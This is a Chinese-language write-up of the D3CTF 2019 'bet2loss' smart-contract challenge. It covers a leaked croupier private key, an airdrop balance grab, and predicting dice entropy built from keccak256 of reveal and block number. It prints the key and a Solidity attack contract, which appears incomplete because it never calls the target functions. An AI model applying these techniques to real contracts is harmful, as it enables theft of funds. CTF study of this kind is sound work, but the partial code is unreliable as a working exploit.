---
title: 【智能合约】D3CTF2019-bet2loss
contest: D3CTF
year: 2019
difficulty: hard
vuln_type: misc_unknown
tags: [智能合约-Solidity, bet2loss, croupier-leaked-key, AirdropCheck-1000-balance, settleBet-private-sendFunds, keccak256-entropy, block.number-赌博, EIP-191-signature]
attack_chain: 1. croupier 私钥泄露 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C /2. AirdropCheck() 薅羊毛 1000 balance /3. settleBet -> settleBetCommon -> sendFunds 调链 /4. 构造 reveal + block.number 让 betnumber 命中 (uint(keccak256(reveal, placeBlockNumber)) % 100) /5. croupier 签名 commitLastBlock/r/s/v 满足 require
key_payload: croupier 0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C  balance > 300000
one_liner: D3CTF 2019 bet2loss 智能合约赌博 + croupier 私钥泄露 + AirdropCheck 薅羊毛 + keccak256 赌博熵预测。
lesson: bet2loss 类赌博合约 require balance > 阈值；AirdropCheck 给新用户 1000 是薅羊毛入口；croupier 私钥泄露可任意签名；keccak256(reveal, block.number) 在合约中可预测。
quality: high
---

# 【智能合约】D3CTF2019-bet2loss

## 概览
D3CTF 2019 智能合约赌博题 bet2loss，croupier 私钥泄露 + 薅羊毛 + 赌博熵预测。

## croupier 私钥泄露
- address: `0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C`
- privatekey: `6F08D741943990742381E1223446553A63B38A3AA86BEEF1E9FC5FCF61E66D12`

## 攻击条件
```solidity
balances[msg.sender] = balances[msg.sender].sub(300000);
// 要求 msg.sender.balance > 300000
```

## 调用链
```
settleBet() external
  -> settleBetCommon()
    -> sendFunds() private
```

## 关键 require
```solidity
require(msg.sender != croupier, "croupier cannot bet with himself.");
require(isContract(msg.sender)==false, "Only bet with real people.");

bytes32 entropy = keccak256(abi.encodePacked(reveal, placeBlockNumber));
uint dice = uint(entropy) % modulo;
if (dice == betnumber) { diceWin = diceWinAmount; }
```

## 攻击 payload
```solidity
pragma solidity ^0.4.23;

interface Bet2Loss {
    function placeBet(uint8, uint8, uint40, uint40, uint, bytes32, bytes32, uint8) external;
    function PayForFlag() external;
}

contract Attack {
    uint8 public betnumber;
    uint8 public modulo = 100;
    uint40 public wager = 1000;
    uint public commit;
    uint public reveal = 10010;
    address public target = 0x724517A39a5B87F7DBc3C5cD2a783Fb20b59Ab1c;
    
    constructor(uint40 commitLastBlock, bytes32 r, bytes32 s, uint8 v) public {
        betnumber = uint8(uint(keccak256(abi.encodePacked(reveal, uint40(block.number)))) % uint(modulo));
        commit = uint(keccak256(abi.encodePacked(reveal)));
    }
}
```

## 经验提炼
- bet2loss 类赌博合约 require balance > 阈值
- AirdropCheck 给新用户 1000 是薅羊毛入口
- croupier 私钥泄露可任意签名
- keccak256(reveal, block.number) 在合约中可预测
- sendFunds 标记 private 但可被 settleBet 间接调用
- isContract(msg.sender) 需用 EOA 或攻击合约构造函数中调用
- EIP-191 签名 v/r/s 验证
- abi.encodePacked 是 Solidity 紧凑编码
- MAX_BET=1000，MIN_BET=1
- modulo 范围 (1, 100]
- EOA 调用才不被 isContract 拒绝
